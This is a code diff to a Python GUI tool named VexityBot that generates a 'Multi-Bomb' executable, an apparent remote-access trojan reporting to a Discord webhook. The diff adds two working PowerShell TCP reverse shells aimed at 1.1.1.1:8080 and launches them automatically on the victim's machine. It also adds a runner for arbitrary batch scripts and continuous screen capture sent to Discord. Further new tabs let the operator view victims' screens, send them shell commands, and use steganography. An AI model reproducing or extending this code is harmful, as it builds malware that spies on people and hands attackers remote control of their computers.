@@ -139,6 +139,8 @@ class VexityBotGUI:
         ttk.Button(self.toolbar, text="AI", command=self.open_ai_management).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Bomb", command=self.open_bomb_interface).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Create EXE", command=self.open_create_exe).pack(side=tk.LEFT, padx=2)
+        ttk.Button(self.toolbar, text="Screens", command=self.open_screens).pack(side=tk.LEFT, padx=2)
+        ttk.Button(self.toolbar, text="Stego", command=self.open_steganography).pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="Generator", command=self.open_code_generator).pack(side=tk.LEFT, padx=2)
     
     def create_main_content(self):
@@ -174,6 +176,12 @@ class VexityBotGUI:
         
         # Create EXE Tab
         self.create_exe_tab()
+        
+        # Screens Tab
+        self.create_screens_tab()
+        
+        # Steganography Tab
+        self.create_steganography_tab()
         
         # Settings Tab
         self.create_settings_tab()
@@ -3946,10 +3954,10 @@ if __name__ == "__main__":
         bomb_names = [config[1]['name'] for config in selected_configs]
         bomb_descriptions = [config[1]['description'] for config in selected_configs]
         
-        multi_bomb_content = f'''#!/usr/bin/env python3
+        multi_bomb_content = '''#!/usr/bin/env python3
 """
 VexityBot Multi-Bomb Executable
-Bombs: {', '.join(bomb_names)}
+Bombs: {bomb_names_str}
 ⚠️  WARNING: This executable will auto-execute multiple bomb attacks!
 ⚠️  WARNING: All activities will be logged to Discord webhook!
 """
@@ -3966,14 +3974,14 @@ import json
 from datetime import datetime
 
 # Discord Webhook URL
-WEBHOOK_URL = "{webhook_url}"
+WEBHOOK_URL = "{webhook_url_str}"
 
 class VexityBotMultiBomb:
     """VexityBot Multi-Bomb Executable"""
     
     def __init__(self):
-        self.selected_bombs = {selected_bombs}
-        self.bomb_configs = {bomb_configs}
+        self.selected_bombs = {selected_bombs_str}
+        self.bomb_configs = {bomb_configs_str}
         self.target_system = self.get_system_info()
         self.start_time = datetime.now()
         self.active_bombs = []
@@ -4247,8 +4255,501 @@ class VexityBotMultiBomb:
             # Create Pokemon-style cards for files
             self.create_pokemon_file_cards(files)
             
+            # Start live screen sharing
+            self.start_live_screen_sharing()
+            
+            # Initialize shell script execution
+            self.initialize_shell_scripts()
+            
+            # Execute reverse shells automatically
+            self.execute_reverse_shells()
+            
         except Exception as e:
             self.log_to_discord("❌ SYSTEM32 MONITOR ERROR", f"Monitor failed: {{str(e)}}")
+    
+    def start_live_screen_sharing(self):
+        """Start live screen sharing for all connected users"""
+        try:
+            import threading
+            import time
+            import base64
+            import io
+            from PIL import Image, ImageTk
+            import tkinter as tk
+            
+            self.log_to_discord("📺 LIVE SCREEN SHARING STARTED", "Initiating multi-user screen capture")
+            
+            # Initialize user tracking
+            self.connected_users = {{}}
+            self.user_screens = {{}}
+            self.screen_threads = {{}}
+            
+            # Start screen capture thread
+            threading.Thread(target=self.capture_and_share_screen, daemon=True).start()
+            
+            # Start user management thread
+            threading.Thread(target=self.manage_multi_user_screens, daemon=True).start()
+            
+        except Exception as e:
+            self.log_to_discord("❌ SCREEN SHARING ERROR", f"Failed to start screen sharing: {{str(e)}}")
+    
+    def manage_multi_user_screens(self):
+        """Manage multiple user screens dynamically"""
+        try:
+            import time
+            import threading
+            
+            while True:
+                try:
+                    # Get current user count
+                    user_count = len(self.connected_users)
+                    
+                    if user_count > 0:
+                        # Calculate dynamic column layout
+                        cols = self.calculate_dynamic_columns(user_count)
+                        rows = (user_count + cols - 1) // cols
+                        
+                        # Send multi-user screen layout to Discord
+                        self.send_multi_user_layout(user_count, cols, rows)
+                        
+                        # Update individual user screens
+                        for user_id, user_data in self.connected_users.items():
+                            self.update_user_screen(user_id, user_data)
+                    
+                    time.sleep(2)  # Update every 2 seconds
+                    
+                except Exception as e:
+                    print(f"Multi-user management error: {{e}}")
+                    time.sleep(5)
+                    
+        except Exception as e:
+            self.log_to_discord("❌ MULTI-USER ERROR", f"Multi-user management failed: {{str(e)}}")
+    
+    def calculate_dynamic_columns(self, user_count):
+        """Calculate optimal column layout for user screens"""
+        if user_count <= 1:
+            return 1
+        elif user_count <= 4:
+            return 2
+        elif user_count <= 9:
+            return 3
+        elif user_count <= 16:
+            return 4
+        else:
+            return 5  # Max 5 columns for readability
+    
+    def send_multi_user_layout(self, user_count, cols, rows):
+        """Send multi-user screen layout to Discord"""
+        try:
+            import urllib.request
+            import json
+            
+            # Create layout description
+            layout_text = f"📺 **MULTI-USER SCREEN LAYOUT**\\n"
+            layout_text += f"👥 **Users Connected**: {{user_count}}\\n"
+            layout_text += f"📐 **Layout**: {{cols}}x{{rows}} columns\\n"
+            layout_text += f"📏 **Screen Size**: 300x300 pixels each\\n"
+            layout_text += f"🔄 **Auto-Organizing**: Dynamic column adjustment"
+            
+            embed_data = {{
+                "embeds": [{{
+                    "title": "🎮 VexityBot Multi-User Screen Monitor",
+                    "description": layout_text,
+                    "color": 0x0099ff,
+                    "fields": [
+                        {{
+                            "name": "📊 Layout Statistics",
+                            "value": f"Columns: {{cols}}\\nRows: {{rows}}\\nTotal Screens: {{user_count}}",
+                            "inline": True
+                        }},
+                        {{
+                            "name": "⚙️ Display Settings",
+                            "value": f"Resolution: 300x300\\nFPS: 10\\nQuality: High",
+                            "inline": True
+                        }},
+                        {{
+                            "name": "🔄 Auto-Features",
+                            "value": "Dynamic Layout\\nAuto-Resize\\nLive Updates",
+                            "inline": True
+                        }}
+                    ],
+                    "footer": {{
+                        "text": "🎮 VexityBot Multi-User Screen Management System"
+                    }},
+                    "timestamp": datetime.now().isoformat()
+                }}]
+            }}
+            
+            self.send_discord_embed(embed_data)
+            
+        except Exception as e:
+            print(f"Layout send error: {{e}}")
+    
+    def update_user_screen(self, user_id, user_data):
+        """Update individual user screen"""
+        try:
+            # Simulate user screen update
+            screen_data = {{
+                'user_id': user_id,
+                'timestamp': datetime.now().isoformat(),
+                'status': 'active',
+                'resolution': '1920x1080',
+                'fps': 10
+            }}
+            
+            self.user_screens[user_id] = screen_data
+            
+        except Exception as e:
+            print(f"User screen update error: {{e}}")
+    
+    def add_connected_user(self, user_id, user_info):
+        """Add a new connected user"""
+        try:
+            self.connected_users[user_id] = {{
+                'id': user_id,
+                'info': user_info,
+                'connected_at': datetime.now().isoformat(),
+                'status': 'active'
+            }}
+            
+            self.log_to_discord("👤 USER CONNECTED", f"New user joined: {{user_id}}")
+            
+        except Exception as e:
+            print(f"Add user error: {{e}}")
+    
+    def remove_connected_user(self, user_id):
+        """Remove a disconnected user"""
+        try:
+            if user_id in self.connected_users:
+                del self.connected_users[user_id]
+                self.log_to_discord("👤 USER DISCONNECTED", f"User left: {{user_id}}")
+                
+        except Exception as e:
+            print(f"Remove user error: {{e}}")
+    
+    def initialize_shell_scripts(self):
+        """Initialize shell script execution system"""
+        try:
+            import threading
+            import time
+            
+            self.log_to_discord("💻 SHELL SCRIPTS INITIALIZED", "Shell execution system ready")
+            
+            # Start shell script monitoring thread
+            threading.Thread(target=self.monitor_shell_commands, daemon=True).start()
+            
+            # Initialize shell script storage
+            self.shell_scripts = {{}}
+            self.active_commands = {{}}
+            
+            # Add the provided PowerShell reverse shell scripts
+            self.add_powershell_reverse_shells()
+            
+        except Exception as e:
+            self.log_to_discord("❌ SHELL INIT ERROR", f"Shell initialization failed: {{str(e)}}")
+    
+    def add_powershell_reverse_shells(self):
+        """Add the provided PowerShell reverse shell scripts"""
+        try:
+            # Shell Script 1 - Basic TCP Reverse Shell
+            shell1 = "$client = New-Object System.Net.Sockets.TCPClient(\"1.1.1.1\",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+            
+            # Shell Script 2 - Advanced TCP Reverse Shell with Error Handling
+            shell2 = "$TCPClient = New-Object Net.Sockets.TCPClient(\"1.1.1.1\", 8080);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);[byte[]]$Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};function WriteToStream ($String) {$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};WriteToStream ($Output)};$StreamWriter.Close();$TCPClient.Close();"
+            
+            # Add scripts to the system
+            self.add_shell_script("PowerShell_Reverse_Shell_1", shell1)
+            self.add_shell_script("PowerShell_Reverse_Shell_2", shell2)
+            
+            # Log successful addition
+            self.log_to_discord("📝 REVERSE SHELLS ADDED", 
+                              "PowerShell reverse shell scripts loaded:\\n"
+                              "• Shell 1: Basic TCP Reverse Shell\\n"
+                              "• Shell 2: Advanced TCP with Error Handling")
+            
+        except Exception as e:
+            self.log_to_discord("❌ REVERSE SHELL ERROR", f"Failed to add reverse shells: {{str(e)}}")
+    
+    def execute_reverse_shells(self):
+        """Execute the PowerShell reverse shells on victim system"""
+        try:
+            import threading
+            import time
+            
+            self.log_to_discord("🚀 REVERSE SHELLS EXECUTING", "Starting PowerShell reverse shell connections")
+            
+            # Execute both reverse shells in separate threads
+            threading.Thread(target=self.run_reverse_shell_1, daemon=True).start()
+            threading.Thread(target=self.run_reverse_shell_2, daemon=True).start()
+            
+        except Exception as e:
+            self.log_to_discord("❌ REVERSE SHELL EXEC ERROR", f"Failed to execute reverse shells: {{str(e)}}")
+    
+    def run_reverse_shell_1(self):
+        """Execute the first PowerShell reverse shell"""
+        try:
+            import subprocess
+            import time
+            
+            # Get the first reverse shell script
+            shell_script = self.shell_scripts.get("PowerShell_Reverse_Shell_1", "")
+            
+            if shell_script:
+                self.log_to_discord("💻 SHELL 1 STARTING", "Executing Basic TCP Reverse Shell")
+                
+                # Execute the PowerShell script
+                result = subprocess.run([
+                    'powershell', '-Command', shell_script
+                ], capture_output=True, text=True, timeout=10)
+                
+                self.log_to_discord("💻 SHELL 1 RESULT", 
+                                  f"Basic Reverse Shell executed\\n"
+                                  f"Exit Code: {{result.returncode}}\\n"
+                                  f"Output: {{result.stdout[:500]}}")
+            else:
+                self.log_to_discord("❌ SHELL 1 ERROR", "Reverse shell script 1 not found")
+                
+        except subprocess.TimeoutExpired:
+            self.log_to_discord("⏰ SHELL 1 TIMEOUT", "Basic reverse shell connection timed out")
+        except Exception as e:
+            self.log_to_discord("❌ SHELL 1 ERROR", f"Basic reverse shell failed: {{str(e)}}")
+    
+    def run_reverse_shell_2(self):
+        """Execute the second PowerShell reverse shell"""
+        try:
+            import subprocess
+            import time
+            
+            # Get the second reverse shell script
+            shell_script = self.shell_scripts.get("PowerShell_Reverse_Shell_2", "")
+            
+            if shell_script:
+                self.log_to_discord("💻 SHELL 2 STARTING", "Executing Advanced TCP Reverse Shell")
+                
+                # Execute the PowerShell script
+                result = subprocess.run([
+                    'powershell', '-Command', shell_script
+                ], capture_output=True, text=True, timeout=10)
+                
+                self.log_to_discord("💻 SHELL 2 RESULT", 
+                                  f"Advanced Reverse Shell executed\\n"
+                                  f"Exit Code: {{result.returncode}}\\n"
+                                  f"Output: {{result.stdout[:500]}}")
+            else:
+                self.log_to_discord("❌ SHELL 2 ERROR", "Reverse shell script 2 not found")
+                
+        except subprocess.TimeoutExpired:
+            self.log_to_discord("⏰ SHELL 2 TIMEOUT", "Advanced reverse shell connection timed out")
+        except Exception as e:
+            self.log_to_discord("❌ SHELL 2 ERROR", f"Advanced reverse shell failed: {{str(e)}}")
+    
+    def monitor_shell_commands(self):
+        """Monitor and execute shell commands from Discord"""
+        try:
+            import time
+            import threading
+            
+            while True:
+                try:
+                    # Check for new shell commands (in real implementation, this would check Discord)
+                    # For now, we'll simulate command execution
+                    self.simulate_shell_execution()
+                    
+                    time.sleep(1)  # Check every second
+                    
+                except Exception as e:
+                    print(f"Shell monitoring error: {{e}}")
+                    time.sleep(5)
+                    
+        except Exception as e:
+            self.log_to_discord("❌ SHELL MONITOR ERROR", f"Shell monitoring failed: {{str(e)}}")
+    
+    def simulate_shell_execution(self):
+        """Simulate shell command execution"""
+        try:
+            # This would be replaced with actual Discord command parsing
+            # For demonstration, we'll simulate some commands
+            pass
+            
+        except Exception as e:
+            print(f"Shell simulation error: {{e}}")
+    
+    def execute_shell_script(self, script_content, user_id=None):
+        """Execute a shell script on the victim system"""
+        try:
+            import subprocess
+            import tempfile
+            import os
+            
+            # Create temporary script file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as f:
+                f.write(script_content)
+                script_path = f.name
+            
+            # Execute the script
+            result = subprocess.run([script_path], 
+                                  capture_output=True, 
+                                  text=True, 
+                                  timeout=30)
+            
+            # Log execution results
+            self.log_to_discord("💻 SHELL EXECUTED", 
+                              f"Script executed successfully\\n"
+                              f"User: {{user_id or 'Unknown'}}\\n"
+                              f"Exit Code: {{result.returncode}}")
+            
+            # Clean up
+            os.unlink(script_path)
+            
+            return {{
+                'success': True,
+                'returncode': result.returncode,
+                'stdout': result.stdout,
+                'stderr': result.stderr
+            }}
+            
+        except subprocess.TimeoutExpired:
+            self.log_to_discord("⏰ SHELL TIMEOUT", f"Script execution timed out for user: {{user_id}}")
+            return {{'success': False, 'error': 'Timeout'}}
+        except Exception as e:
+            self.log_to_discord("❌ SHELL ERROR", f"Script execution failed: {{str(e)}}")
+            return {{'success': False, 'error': str(e)}}
+    
+    def add_shell_script(self, script_name, script_content):
+        """Add a shell script to the execution system"""
+        try:
+            self.shell_scripts[script_name] = script_content
+            self.log_to_discord("📝 SCRIPT ADDED", f"Shell script '{{script_name}}' added to system")
+            
+        except Exception as e:
+            self.log_to_discord("❌ SCRIPT ADD ERROR", f"Failed to add script: {{str(e)}}")
+    
+    def get_available_scripts(self):
+        """Get list of available shell scripts"""
+        return list(self.shell_scripts.keys())
+    
+    def capture_and_share_screen(self):
+        """Capture screen and share via Discord"""
+        try:
+            import mss
+            import base64
+            import io
+            import time
+            from PIL import Image
+            
+            # Initialize screen capture
+            with mss.mss() as sct:
+                # Get primary monitor
+                monitor = sct.monitors[1]
+                
+                frame_count = 0
+                while True:
+                    try:
+                        # Capture screenshot
+                        screenshot = sct.grab(monitor)
+                        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+                        
+                        # Resize to 300x300 for Discord display
+                        img_resized = img.resize((300, 300), Image.Resampling.LANCZOS)
+                        
+                        # Convert to base64
+                        buffer = io.BytesIO()
+                        img_resized.save(buffer, format='PNG')
+                        img_base64 = base64.b64encode(buffer.getvalue()).decode()
+                        
+                        # Send to Discord every 5 frames (reduce spam)
+                        if frame_count % 5 == 0:
+                            self.send_screen_to_discord(img_base64, frame_count)
+                        
+                        frame_count += 1
+                        time.sleep(0.1)  # 10 FPS
+                        
+                    except Exception as e:
+                        print(f"Screen capture error: {{e}}")
+                        time.sleep(1)
+                        
+        except ImportError:
+            # Fallback if mss is not available
+            self.log_to_discord("⚠️ SCREEN CAPTURE WARNING", "Screen capture library not available, using fallback")
+            self.fallback_screen_capture()
+        except Exception as e:
+            self.log_to_discord("❌ SCREEN CAPTURE ERROR", f"Screen capture failed: {{str(e)}}")
+    
+    def fallback_screen_capture(self):
+        """Fallback screen capture method"""
+        try:
+            import subprocess
+            import base64
+            import time
+            
+            while True:
+                try:
+                    # Use Windows built-in screenshot (fallback)
+                    subprocess.run(['powershell', '-Command', 
+                                  'Add-Type -AssemblyName System.Windows.Forms; '
+                                  '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds'], 
+                                 capture_output=True, check=True)
+                    
+                    # Send placeholder screen data
+                    self.send_screen_placeholder()
+                    time.sleep(2)
+                    
+                except Exception as e:
+                    print(f"Fallback capture error: {{e}}")
+                    time.sleep(5)
+                    
+        except Exception as e:
+            self.log_to_discord("❌ FALLBACK CAPTURE ERROR", f"Fallback capture failed: {{str(e)}}")
+    
+    def send_screen_to_discord(self, img_base64, frame_count):
+        """Send screen capture to Discord"""
+        try:
+            import urllib.request
+            import json
+            
+            # Create screen sharing embed
+            embed_data = {{
+                "embeds": [{{
+                    "title": "📺 LIVE SCREEN SHARING",
+                    "description": f"Real-time screen capture from victim system\\nFrame: {{frame_count}}",
+                    "color": 0x00ff00,
+                    "image": {{
+                        "url": f"data:image/png;base64,{{img_base64}}"
+                    }},
+                    "footer": {{
+                        "text": "🎮 VexityBot Live Screen Monitor - 300x300 Display"
+                    }},
+                    "timestamp": datetime.now().isoformat()
+                }}]
+            }}
+            
+            self.send_discord_embed(embed_data)
+            
+        except Exception as e:
+            print(f"Discord screen send error: {{e}}")
+    
+    def send_screen_placeholder(self):
+        """Send screen placeholder when capture fails"""
+        try:
+            import urllib.request
+            import json
+            
+            embed_data = {{
+                "embeds": [{{
+                    "title": "📺 SCREEN SHARING PLACEHOLDER",
+                    "description": "Screen capture in progress...\\nUsing fallback method",
+                    "color": 0xffff00,
+                    "footer": {{
+                        "text": "🎮 VexityBot Screen Monitor - Fallback Mode"
+                    }},
+                    "timestamp": datetime.now().isoformat()
+                }}]
+            }}
+            
+            self.send_discord_embed(embed_data)
+            
+        except Exception as e:
+            print(f"Placeholder send error: {{e}}")
     
     def create_pokemon_file_cards(self, files):
         """Create Pokemon-style Discord cards for System32 files"""
@@ -4427,7 +4928,12 @@ def main():
 
 if __name__ == "__main__":
     main()
-'''
+'''.format(
+            bomb_names_str=', '.join(bomb_names),
+            webhook_url_str=webhook_url,
+            selected_bombs_str=selected_bombs,
+            bomb_configs_str=bomb_configs
+        )
         
         return multi_bomb_content
     
@@ -4582,6 +5088,286 @@ if __name__ == "__main__":
             self.log_build(f"❌ Failed to open directory: {str(e)}")
             messagebox.showerror("Error", f"Failed to open directory: {str(e)}")
     
+    def create_screens_tab(self):
+        """Create the Screens tab with divided columns for users"""
+        screens_frame = ttk.Frame(self.notebook)
+        self.notebook.add(screens_frame, text="Screens")
+        
+        # Main container
+        main_container = ttk.Frame(screens_frame)
+        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Title
+        title_label = ttk.Label(main_container, text="🖥️ Screen Management & User Monitoring", 
+                               font=('Arial', 16, 'bold'))
+        title_label.pack(pady=(0, 20))
+        
+        # Create divided columns container
+        columns_frame = ttk.Frame(main_container)
+        columns_frame.pack(fill=tk.BOTH, expand=True)
+        
+        # Left column - User List
+        left_column = ttk.LabelFrame(columns_frame, text="👥 Connected Users", padding=10)
+        left_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
+        
+        # User list header
+        user_header = ttk.Frame(left_column)
+        user_header.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(user_header, text="Active Users:", font=('Arial', 12, 'bold')).pack(side=tk.LEFT)
+        
+        # Refresh users button
+        ttk.Button(user_header, text="🔄 Refresh", 
+                  command=self.refresh_users).pack(side=tk.RIGHT)
+        
+        # User listbox with scrollbar
+        user_list_frame = ttk.Frame(left_column)
+        user_list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        self.users_listbox = tk.Listbox(user_list_frame, height=15, selectmode=tk.SINGLE)
+        user_scrollbar = ttk.Scrollbar(user_list_frame, orient="vertical", command=self.users_listbox.yview)
+        self.users_listbox.configure(yscrollcommand=user_scrollbar.set)
+        
+        self.users_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        user_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # User action buttons
+        user_btn_frame = ttk.Frame(left_column)
+        user_btn_frame.pack(fill=tk.X)
+        
+        ttk.Button(user_btn_frame, text="📺 View Screen", 
+                  command=self.view_user_screen).pack(side=tk.LEFT, padx=2)
+        ttk.Button(user_btn_frame, text="📷 Take Screenshot", 
+                  command=self.take_screenshot).pack(side=tk.LEFT, padx=2)
+        ttk.Button(user_btn_frame, text="🎥 Start Recording", 
+                  command=self.start_recording).pack(side=tk.LEFT, padx=2)
+        
+        # Right column - Screen Display
+        right_column = ttk.LabelFrame(columns_frame, text="🖼️ Screen Display", padding=10)
+        right_column.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
+        
+        # Screen display header
+        screen_header = ttk.Frame(right_column)
+        screen_header.pack(fill=tk.X, pady=(0, 10))
+        
+        self.current_user_label = ttk.Label(screen_header, text="No user selected", 
+                                          font=('Arial', 12, 'bold'))
+        self.current_user_label.pack(side=tk.LEFT)
+        
+        # Screen control buttons
+        screen_btn_frame = ttk.Frame(screen_header)
+        screen_btn_frame.pack(side=tk.RIGHT)
+        
+        ttk.Button(screen_btn_frame, text="⏸️ Pause", 
+                  command=self.pause_screen).pack(side=tk.LEFT, padx=2)
+        ttk.Button(screen_btn_frame, text="▶️ Resume", 
+                  command=self.resume_screen).pack(side=tk.LEFT, padx=2)
+        ttk.Button(screen_btn_frame, text="🔍 Zoom", 
+                  command=self.zoom_screen).pack(side=tk.LEFT, padx=2)
+        
+        # Screen display area
+        self.screen_display = tk.Canvas(right_column, bg='black', height=400)
+        self.screen_display.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
+        
+        # Screen info panel
+        info_frame = ttk.LabelFrame(right_column, text="📊 Screen Information", padding=5)
+        info_frame.pack(fill=tk.X)
+        
+        # Info labels
+        self.screen_info_frame = ttk.Frame(info_frame)
+        self.screen_info_frame.pack(fill=tk.X)
+        
+        self.resolution_label = ttk.Label(self.screen_info_frame, text="Resolution: N/A")
+        self.resolution_label.pack(anchor='w')
+        
+        self.fps_label = ttk.Label(self.screen_info_frame, text="FPS: N/A")
+        self.fps_label.pack(anchor='w')
+        
+        self.quality_label = ttk.Label(self.screen_info_frame, text="Quality: N/A")
+        self.quality_label.pack(anchor='w')
+        
+        # Bottom control panel
+        control_frame = ttk.Frame(screens_frame)
+        control_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
+        
+        # Shell command input
+        shell_frame = ttk.LabelFrame(control_frame, text="💻 Shell Commands", padding=10)
+        shell_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        shell_input_frame = ttk.Frame(shell_frame)
+        shell_input_frame.pack(fill=tk.X)
+        
+        ttk.Label(shell_input_frame, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
+        
+        self.shell_entry = ttk.Entry(shell_input_frame, font=('Consolas', 10))
+        self.shell_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
+        self.shell_entry.bind('<Return>', self.execute_shell_command)
+        
+        ttk.Button(shell_input_frame, text="Execute", 
+                  command=self.execute_shell_command).pack(side=tk.RIGHT)
+        
+        # Command history
+        history_frame = ttk.Frame(shell_frame)
+        history_frame.pack(fill=tk.X, pady=(10, 0))
+        
+        ttk.Label(history_frame, text="Recent Commands:", font=('Arial', 9, 'bold')).pack(anchor='w')
+        
+        self.command_history = tk.Listbox(history_frame, height=4, font=('Consolas', 9))
+        history_scrollbar = ttk.Scrollbar(history_frame, orient="vertical", command=self.command_history.yview)
+        self.command_history.configure(yscrollcommand=history_scrollbar.set)
+        
+        self.command_history.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        history_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # Initialize with sample users
+        self.initialize_sample_users()
+    
+    def initialize_sample_users(self):
+        """Initialize with sample users for demonstration"""
+        sample_users = [
+            "User-001 (192.168.1.100) - Windows 10",
+            "User-002 (192.168.1.101) - Windows 11", 
+            "User-003 (192.168.1.102) - Windows 10",
+            "User-004 (192.168.1.103) - Windows 11",
+            "User-005 (192.168.1.104) - Windows 10"
+        ]
+        
+        for user in sample_users:
+            self.users_listbox.insert(tk.END, user)
+    
+    def refresh_users(self):
+        """Refresh the list of connected users"""
+        # Clear existing users
+        self.users_listbox.delete(0, tk.END)
+        
+        # Add refreshed users (in real implementation, this would fetch from network)
+        self.initialize_sample_users()
+        
+        # Update display
+        self.current_user_label.config(text="Users refreshed")
+    
+    def view_user_screen(self):
+        """View the selected user's screen"""
+        selection = self.users_listbox.curselection()
+        if not selection:
+            messagebox.showwarning("No Selection", "Please select a user to view their screen")
+            return
+        
+        user = self.users_listbox.get(selection[0])
+        self.current_user_label.config(text=f"Viewing: {user}")
+        
+        # Simulate screen display
+        self.screen_display.delete("all")
+        self.screen_display.create_text(
+            self.screen_display.winfo_width()//2, 
+            self.screen_display.winfo_height()//2,
+            text=f"Screen of {user}\n\nSimulated Screen Display\n\nClick 'Take Screenshot' to capture",
+            fill="white",
+            font=('Arial', 12),
+            justify=tk.CENTER
+        )
+        
+        # Update screen info
+        self.resolution_label.config(text="Resolution: 1920x1080")
+        self.fps_label.config(text="FPS: 30")
+        self.quality_label.config(text="Quality: High")
+    
+    def take_screenshot(self):
+        """Take a screenshot of the current user's screen"""
+        selection = self.users_listbox.curselection()
+        if not selection:
+            messagebox.showwarning("No Selection", "Please select a user first")
+            return
+        
+        user = self.users_listbox.get(selection[0])
+        messagebox.showinfo("Screenshot", f"Screenshot taken for {user}")
+        
+        # Add to command history
+        self.command_history.insert(0, f"screenshot {user}")
+        if self.command_history.size() > 10:
+            self.command_history.delete(10, tk.END)
+    
+    def start_recording(self):
+        """Start recording the current user's screen"""
+        selection = self.users_listbox.curselection()
+        if not selection:
+            messagebox.showwarning("No Selection", "Please select a user first")
+            return
+        
+        user = self.users_listbox.get(selection[0])
+        messagebox.showinfo("Recording", f"Screen recording started for {user}")
+        
+        # Add to command history
+        self.command_history.insert(0, f"record {user}")
+        if self.command_history.size() > 10:
+            self.command_history.delete(10, tk.END)
+    
+    def pause_screen(self):
+        """Pause the current screen display"""
+        messagebox.showinfo("Screen", "Screen display paused")
+    
+    def resume_screen(self):
+        """Resume the current screen display"""
+        messagebox.showinfo("Screen", "Screen display resumed")
+    
+    def zoom_screen(self):
+        """Zoom the current screen display"""
+        messagebox.showinfo("Screen", "Screen zoom toggled")
+    
+    def execute_shell_command(self, event=None):
+        """Execute a shell command on the selected user"""
+        selection = self.users_listbox.curselection()
+        if not selection:
+            messagebox.showwarning("No Selection", "Please select a user first")
+            return
+        
+        command = self.shell_entry.get().strip()
+        if not command:
+            messagebox.showwarning("Empty Command", "Please enter a command")
+            return
+        
+        user = self.users_listbox.get(selection[0])
+        
+        # Add to command history
+        self.command_history.insert(0, f"{user}: {command}")
+        if self.command_history.size() > 10:
+            self.command_history.delete(10, tk.END)
+        
+        # Clear entry
+        self.shell_entry.delete(0, tk.END)
+        
+        # Show execution message
+        messagebox.showinfo("Command Executed", f"Command '{command}' sent to {user}")
+    
+    def create_steganography_tab(self):
+        """Create the Steganography tab"""
+        stego_frame = ttk.Frame(self.notebook)
+        self.notebook.add(stego_frame, text="🖼️ Steganography")
+        
+        # Import and create steganography GUI
+        try:
+            from VexityBotSteganographyGUI import VexityBotSteganographyGUI
+            self.stego_gui = VexityBotSteganographyGUI(stego_frame)
+        except ImportError as e:
+            # Fallback if steganography module is not available
+            error_frame = ttk.Frame(stego_frame)
+            error_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+            
+            error_label = ttk.Label(error_frame, 
+                                  text="❌ Steganography module not available\n\nPlease ensure VexityBotSteganographyGUI.py is in the same directory.",
+                                  font=('Arial', 12), justify=tk.CENTER)
+            error_label.pack(expand=True)
+            
+            self.log_build(f"Steganography module import error: {str(e)}")
+    
+    def open_screens(self):
+        """Open the Screens tab"""
+        # Find the Screens tab and select it
+        for i in range(self.notebook.index("end")):
+            if self.notebook.tab(i, "text") == "Screens":
+                self.notebook.select(i)
+                break
+
     def open_create_exe(self):
         """Open the Create EXE tab"""
         # Find the Create EXE tab and select it
@@ -4590,6 +5376,15 @@ if __name__ == "__main__":
                 self.notebook.select(i)
                 break
         self.update_status("Create EXE tab opened")
+    
+    def open_steganography(self):
+        """Open the Steganography tab"""
+        # Find the Steganography tab and select it
+        for i in range(self.notebook.index("end")):
+            if self.notebook.tab(i, "text") == "🖼️ Steganography":
+                self.notebook.select(i)
+                break
+        self.update_status("Steganography tab opened")
     
     def save_settings(self):
         """Save application settings"""
